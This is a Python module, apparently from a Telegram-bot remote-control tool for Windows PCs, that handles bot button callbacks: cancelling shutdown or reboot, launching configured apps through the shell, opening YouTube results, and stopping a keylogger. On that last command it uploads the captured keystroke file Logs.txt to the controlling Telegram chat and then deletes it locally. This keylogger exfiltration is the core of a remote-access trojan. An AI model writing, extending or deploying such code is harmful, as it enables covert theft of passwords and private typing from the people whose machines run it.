from os import ( path as os_path, remove as os_remove )
from subprocess import call

from ..utils import openInBrowser
from .check import check


@check
def callbackHandler(self):
    # try:

    # keylogger
    if self.call.data == 'disableKeylogger':
        self.keyloggerKeys = []
        self.bot.send_chat_action(self.call.message.chat.id, 'upload_document')
        self.keyloggerFlag = True
        self.bot.send_message(self.call.message.chat.id, '⛔ Keylogger *deactivated*', parse_mode = 'Markdown')

        if not os_path.exists('./Logs.txt'):
            self.bot.send_message(self.call.message.chat.id, '*📄 Error*, logs not found', parse_mode = 'Markdown')

        self.bot.send_message(self.call.message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
        file = open('Logs.txt', 'rb')
        self.bot.send_document(self.call.message.chat.id, file)
        file.close()

        if os_path.exists('./Logs.txt'):
            os_remove('./Logs.txt')



    # shutdown
    elif self.call.data == 'cancelShutdown':
        call('shutdown /a', shell = True)
        self.bot.send_message(self.call.message.chat.id, '🛑 Shutdown *canceled*', parse_mode = 'Markdown')



    # reboot
    elif self.call.data == 'cancelReboot':
        call('shutdown /a', shell = True)
        self.bot.send_message(self.call.message.chat.id, '🛑 Reboot *canceled*', parse_mode = 'Markdown')



    # sleep
    elif self.call.data == 'cancelHibernate':
        self.hibernateFlag = True
        self.bot.send_message(self.call.message.chat.id, '🛑 Hibernate *canceled*', parse_mode = 'Markdown')



    # apps
    for key in self.data.apps:
        if self.call.data == key:
            if not os_path.exists(self.data.apps[key]):
                self.bot.send_message(call.message.chat.id, f'⛔ *{key}* is *not found*', parse_mode = 'Markdown')

            path = self.data.apps[key]
            call(f"\"{path}\"", shell = True)
            self.bot.send_message(self.call.message.chat.id, f'✅ Opening *{key}*', parse_mode = 'Markdown')



    # youtube
    for index in range(self.MAX_SEARCH_LEN):
        if len(self.ytResults) == 0:
            return

        if (self.call.data == f'ytSearch_{index}'):
            openInBrowser(self.ytResults[index]['link'])


    # except:
        # self.bot.send_message(self.message.chat.id, '*⛔  Error occurred*', parse_mode = 'Markdown')
